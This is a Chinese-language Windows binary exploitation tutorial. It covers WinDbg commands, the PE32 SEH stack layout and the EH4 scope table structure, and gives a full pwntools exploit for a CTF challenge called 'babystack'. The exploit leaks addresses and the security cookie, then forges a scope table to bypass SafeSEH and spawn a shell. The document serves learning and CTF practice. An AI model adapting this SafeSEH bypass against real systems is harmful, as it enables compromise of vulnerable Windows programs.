# Window Pwn 入门

## Windbg tips

* `lm`: 查看模块信息
```
> lm
tart    end        module name
00a00000 00a07000   babystack   (no symbols)           
69090000 690a4000   VCRUNTIME140   (deferred)             
75240000 75320000   KERNEL32   (deferred)             
75940000 75a62000   ucrtbase   (deferred)             
76d10000 76f09000   KERNELBASE   (deferred)             
776e0000 7787c000   ntdll      (pdb symbols)          c:\mysymbol\wntdll.pdb\F9EA7A7F41206C21D2ED4E99993A9EF41\wntdll.pdb
```

* `k`: 显示调用栈
```
> k
 # ChildEBP RetAddr  
00 02b6f87c 7778b3c9 ntdll!DbgBreakPoint
01 02b6f8ac 75260419 ntdll!DbgUiRemoteBreakin+0x39
02 02b6f8bc 7774662d KERNEL32!BaseThreadInitThunk+0x19
03 02b6f918 777465fd ntdll!__RtlUserThreadStart+0x2f
04 02b6f928 00000000 ntdll!_RtlUserThreadStart+0x1b
```

* `!threads, .thread, !process, .process`: 显示进程线程信息

* `d`: 读取内存
* `du`: 读取字符串
* `dd, dc`

* `bp addr`: 下断点

* `bl`: 查看已下的断点

* `!exchain`: Exception handler

* `d fs:[0]`: 查看当前SEH的起始位置，或者用`!teb`查看。

* `dps $csp, dps @esp`: 看栈数据

* `r`: 查看寄存器

* `dt _NT_TIB 0x99f8e4`: 按类型查看

* `!teb`: thread environment block

## SEH(Structured Exception Handler) & SafeSEH

### Babystack
### 题目分析
首先确认下PE32栈布局
```
ebp ^ cookie            ebp-0x1c
esp                     ebp-0x18
xxxx                    ebp-0x14
Exception_List          ebp-0x10
handler                 ebp-0xc
scope_table ^ cookie    ebp-0x8
trylevel                ebp-0x4
original_ebp            ebp
Retaddr                 ebp+0x4
```
在没有SafeSEH的情况下，简单修改handler就可以控住pc。
但开启了SafeSEH后，触发exception时会检查handler是否在_safe_se_handler_table中。

在开启了SafeSEH后，一种bypass方法是伪造scope_table。

下面简单介绍一下scope_table的结构:
```
struct _EH4_SCOPETABLE {
        DWORD GSCookieOffset;
        DWORD GSCookieXOROffset;
        DWORD EHCookieOffset;
        DWORD EHCookieXOROffset;
        _EH4_SCOPETABLE_RECORD ScopeRecord[1];
};

struct _EH4_SCOPETABLE_RECORD {
        DWORD EnclosingLevel;
        long (*FilterFunc)();
            union {
            void (*HandlerAddress)();
            void (*FinallyFunc)(); 
    };
};
```

我们比较想控住的是其中的FilterFunc或FinallyFunc。

本题目中送了codebase和stack addr。故可以在栈上伪造一个fake scope_table，再把`[ebp-0x4]`处的值设置为`fake_scope_table ^ cookie`。

但不难发现，利用stack overflow修改`[ebp-0x4]`时，会覆盖掉一些敏感的值，比如`ebp ^ cookie`, `Exception_List`, `handler`。所以在exploit时，要先确保这些值可以过check。

`handler`的话可以用windbg attach上去看看`!exchain`，即`the list of exception handlers for the current thread`。`Exception_List`的话可以用`d fs:[0]`或者`!teb`查看。

### 题目EXP
```
from pwn import *
if args['DEBUG']:
    context.log_level = "debug"

conn = remote("192.168.234.1", 10009)

conn.recvuntil("stack address = ")
leak_stack = int(conn.recvuntil("\r\n", drop=True),16)
print '[stack]: ' + hex(leak_stack)
conn.recvuntil("main address = ")
leak_main = int(conn.recvuntil("\r\n", drop=True), 16)
print '[main]: ' + hex(leak_main)

ebp = leak_stack + 0x9c
cookie_addr = leak_main + (0x404004-0x4010b0)

fs_0_addr = leak_stack + 0x9c - 0x10 #ebp-0x10
handler = leak_stack + 0x9c - 0xc #ebp-0xc

#leak info
conn.sendlineafter("more?\r\n", "yes")
conn.sendlineafter("know\r\n", str(cookie_addr))
conn.recvuntil("value is ")
cookie_val = int(conn.recvuntil("\r\n", drop=True),16)
print '[cookie]: ' + hex(cookie_val)

conn.sendlineafter("more?\r\n", "yes")
conn.sendlineafter("know\r\n", str(fs_0_addr))
conn.recvuntil("value is ")
fs_0_val = int(conn.recvuntil("\r\n", drop=True), 16)
print '[fs_0]: ' + hex(fs_0_val)

#fake scope_table
shell_addr = leak_main + (0x40138d - 0x4010b0)
fake_scope_table = p32(0xFFFFFFE4) #GSCookieOffset
fake_scope_table += p32(0) #GSCookieXOROffset
fake_scope_table += p32(0xFFFFFF20) #EHCookieOffset
fake_scope_table += p32(0) #EHCookieXOROffset
fake_scope_table += p32(0xFFFFFFFE) #ScopeRecord.EnclosingLevel
fake_scope_table += p32(shell_addr) #ScopeRecord.FilterFunc
fake_scope_table += p32(shell_addr) #ScopeRecord.HandlerFunc

#first 4*'a' as padding
payload = 'a'*4 + fake_scope_table.ljust(0x80-4, '\x00') + p32(ebp ^ cookie_val) + 'a'*8 + p32(fs_0_val) + p32(leak_main+0x401460-0x4010b0) + p32((leak_stack+4)^cookie_val)+p32(0)
conn.sendlineafter("more?\r\n", 'djr')
conn.sendline(payload)

conn.sendlineafter("more?\r\n", 'yes')
conn.sendlineafter("know\r\n", str(0))

conn.interactive()

```

### 参考
[1] http://radishes.top/2019/10/07/2019-10-09-SEH%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/#1-TIB%E7%BB%93%E6%9E%84
[2] https://github.com/Ex-Origin/win_server 









